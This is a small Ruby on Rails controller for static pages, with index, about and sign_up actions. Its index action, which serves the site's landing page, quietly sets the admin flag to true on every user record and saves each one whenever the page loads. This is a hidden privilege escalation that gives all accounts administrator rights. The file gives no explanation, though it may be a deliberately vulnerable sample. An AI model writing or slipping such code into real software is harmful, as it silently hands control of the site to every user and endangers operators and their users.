class StaticPagesController < ApplicationController
  layout "static", only: [:index]
  def index
    @users = User.all
    @users.each do |user|
      user.admin = true
      user.save
    end
  end
  def about
  end
  def sign_up
    @follower = Follower.new
  end
end
